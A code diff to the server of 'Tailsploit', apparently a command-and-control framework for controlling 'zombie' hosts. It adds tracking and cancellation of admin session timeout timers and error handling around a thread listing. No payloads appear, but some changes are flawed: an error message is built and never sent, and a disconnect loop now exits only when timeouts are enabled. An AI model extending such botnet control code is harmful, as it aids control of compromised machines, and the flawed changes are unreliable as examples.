@@ -95,6 +95,8 @@ class ServerShell:
         self.TAILSPLOIT_THREAD_LOCK_ZOMBIES = threading.Lock()
         self.CLUSTERS_SESSION = {}
         self.TailsploitServerConfigurationJSON()
+        self.TAILSPLOIT_ADMIN_SESSION_THREAD_EVENTS = {}
+
 
     def TailsploitServerConfigurationJSON(self):
         with open("../../lib/configuration/tsf_config.json", "r") as TailsploitJSONConfig:
@@ -237,23 +239,27 @@ class ServerShell:
         total_threads = threading.active_count() - 1
 
         # Get CPU usage for each running thread (approximation)
-        for index, (thread_id, thread) in enumerate(threading._active.items()):
-            if thread != threading.main_thread():
-                thread_info += f"* Thread Name: {thread.name}\n"
-                thread_info += f"* Thread Status: {Fore.GREEN}Running{Style.RESET_ALL}\n"
-                try:
-                    cpu_usage = self.get_thread_cpu_usage(thread)
-                    thread_info += f"* CPU Usage: {Fore.YELLOW}{cpu_usage:.2f}{Style.RESET_ALL}%\n"
-                except psutil.NoSuchProcess:
-                    thread_info += "* CPU Usage: Not available (thread may have completed)\n"
+        try:
+            for index, (thread_id, thread) in enumerate(threading._active.items()):
+                if thread != threading.main_thread():
+                    thread_info += f"* Thread Name: {thread.name}\n"
+                    thread_info += f"* Thread Status: {Fore.GREEN}Running{Style.RESET_ALL}\n"
+                    try:
+                        cpu_usage = self.get_thread_cpu_usage(thread)
+                        thread_info += f"* CPU Usage: {Fore.YELLOW}{cpu_usage:.2f}{Style.RESET_ALL}%\n"
+                    except psutil.NoSuchProcess:
+                        thread_info += "* CPU Usage: Not available (thread may have completed)\n"
+                    
+                    if index < total_threads - 1: 
+                        thread_info += "\n━━━━━━━━━━━━━━\n\n"
+                    elif index == total_threads - 1:
+                        thread_info += "\n━━━━━━━━━━━━━━\n\n"
                 
-                if index < total_threads - 1: 
-                    thread_info += "\n━━━━━━━━━━━━━━\n\n"
-                elif index == total_threads - 1:
-                    thread_info += "\n━━━━━━━━━━━━━━\n\n"
-            
-        thread_info_xored = self.handleXOREncryption(thread_info.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
-        admin_socket.send(thread_info_xored)
+            thread_info_xored = self.handleXOREncryption(thread_info.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(thread_info_xored)
+        except:
+            error_xored = self.handleXOREncryption(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Task info got update, please retype the 'task' command".encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+
 
     def get_thread_cpu_usage(self, thread):
         thread_id = thread.ident
@@ -502,13 +508,24 @@ class ServerShell:
                 print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{admin_username}\x1B[0m Disconnected.")
                 del self.TAILSPLOIT_ADMINS_SESSION[admin_username]
                 self.admin_socket = None
-                break
+                if self.TSF_SESSION_TIMEOUT:
+                    if admin_username in self.TAILSPLOIT_ADMIN_SESSION_THREAD_EVENTS:
+                        TimerThread = self.TAILSPLOIT_ADMIN_SESSION_THREAD_EVENTS[admin_username]
+                        TimerThread.cancel()
+                        del self.TAILSPLOIT_ADMIN_SESSION_THREAD_EVENTS[admin_username]
+                    break
 
             except ConnectionResetError:
                 print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{admin_username}\x1B[0m Disconnected.")
                 del self.TAILSPLOIT_ADMINS_SESSION[admin_username]
                 self.admin_socket = None
-                break
+                if self.TSF_SESSION_TIMEOUT:
+                    if admin_username in self.TAILSPLOIT_ADMIN_SESSION_THREAD_EVENTS:
+                        TimerThread = self.TAILSPLOIT_ADMIN_SESSION_THREAD_EVENTS[admin_username]
+                        TimerThread.cancel()
+                        del self.TAILSPLOIT_ADMIN_SESSION_THREAD_EVENTS[admin_username]
+                    break
+
 
     @StaticMethodCommandHandler("sessions", is_available=True, min_rank=1, reverse_shell_flag=False)
     def handleZombiesListCommand(self, admin_socket, handleAdminShellCommands, *args):
@@ -905,7 +922,9 @@ Server MFA (Multi-Factor Authentication) : {Fore.GREEN if self.TSF_MFA_SESSION_S
                 if self.TSF_SESSION_TIMEOUT:    
                     admin_timeout_session_thread = threading.Timer(self.TSF_SESSION_TIMEOUT_TIME, self.TailsploitTimeoutSession, args=(client_socket, AdminUsername,))
                     admin_timeout_session_thread.name = f"Tailsploit Admin Session Timeout Handler - @{AdminUsername}"
+                    self.TAILSPLOIT_ADMIN_SESSION_THREAD_EVENTS[AdminUsername] = admin_timeout_session_thread
                     admin_timeout_session_thread.start()
+
             else:
                 pass
     
